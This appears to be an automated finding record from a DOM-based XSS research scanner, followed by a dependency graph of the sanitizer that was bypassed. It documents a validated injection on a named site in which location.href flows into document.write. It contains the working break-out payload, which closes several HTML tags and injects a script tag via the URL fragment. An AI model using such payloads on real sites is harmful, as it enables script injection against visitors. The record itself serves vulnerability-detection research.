// Finding: 24662f42-3c8a-4122-acd3-a77ad691bc02
// Finding.url: https://www.example428.com/nb_friends.php##"></iframe></style></script></object></embed></textarea><script>taintfoxLog('0614b862d7764b2b86049e7cb286c70c')</script><!--/*
// Finding.parentloc: https://www.example428.com/nb_friends.php##"></iframe></style></script></object></embed></textarea><script>taintfoxLog('0614b862d7764b2b86049e7cb286c70c')</script><!--/*
// Finding.domain: www.example428.com
// Finding.base_domain: example428.com
// Finding.source: location.href
// Finding.sink: document.write
// Sanitizer.score: 3
// Sanitizer.name: addslashes
// Sanitizer.location: https://i.example338.com/4Ek/JS/global/tpanel_lgn1.js - <anonymous>:50:21
// Finding.begin: 193
// Finding.end: 363
// Finding.original_uuid: c16f63a2-ab18-4b73-b0a7-027e87d78f32
// Finding.TwentyFiveMillionFlowsId: -1553427501
// Finding.script: https://i.example338.com/4Ek/JS/global/tpanel_lgn1.js
// Finding.line: 54
// Exploit.uuid: 0614b862-d776-4b2b-8604-9e7cb286c70c
// Exploit.success: true
// Exploit.status: validated
// Exploit.method: C
// Exploit.type: html
// Exploit.token: attribute
// Exploit.content: src
// Exploit.quote_type: "
// Exploit.tag: img
// Exploit.break_out: #"></iframe></style></script></object></embed></textarea><script>
// Exploit.break_in: </script><!--/*
// Exploit.payload: #"></iframe></style></script></object></embed></textarea><script>taintfoxLog(1)</script><!--/*
// Exploit.begin_taint_url: 0
// Exploit.end_taint_url: 42
// Exploit.replace_begin_url: 42
// Exploit.replace_end_url: 42
// Exploit.replace_begin_param: 93
// Exploit.replace_end_param: 93
// Issues.LargestEncodeAttrStringChain: 0
// Issues.LargestTextFragmentEncodeChainLength: 0
// Issues.HasApproximation: false
// Issues.HasMissingImplementation: false
// Issues.HasInfiniteRegexWithFunctionReplacer: false
// Issues.MergedSplitAndJoins: false
// Issues.HasUrlInRhsOfReplace: false
// Issues.HasUrlInLhsOfReplace: false
// Issues.HasCookieValueInLhsOfreplace: false
// Issues.HasCookieValueInRhsOfreplace: false
// Issues.HasCookieValueInMatchPattern: false
// Issues.HasCookieValueInExecPattern: false
// Issues.RemovedLRConcats: false
// Issues.RemovedReplaceArtifacts: false
// Issues.HasUrlInMatchPattern: false
// Issues.HasUrlInExecPattern: false
// Issues.RemovedNOPreplaces: false
// Issues.Known_sanitizer: false
// DepGraph.hash: -2110722371
// DepGraph.sanitizer_hash: -2110722371

digraph cfg {
n0 [shape=house, label="Input: x"];
n1 [shape=ellipse, label="preg_replace"];
n2 [shape=box, label="RegExp: /(["'])/"];
n3 [shape=box, label="Lit: \$1"];
n4 [shape=box, label="Var: x"];
n5 [shape=ellipse, label="str_replace_once"];
n6 [shape=box, label="Lit: /"];
n7 [shape=box, label="Lit: \0"];
n8 [shape=box, label="Var: x"];
n9 [shape=box, label="Var: x"];
n10 [shape=doubleoctagon, label="Return: x"];
n4 -> n0;
n1 -> n2;
n1 -> n3;
n1 -> n4;
n8 -> n1;
n5 -> n6;
n5 -> n7;
n5 -> n8;
n9 -> n5;
n10 -> n9;
}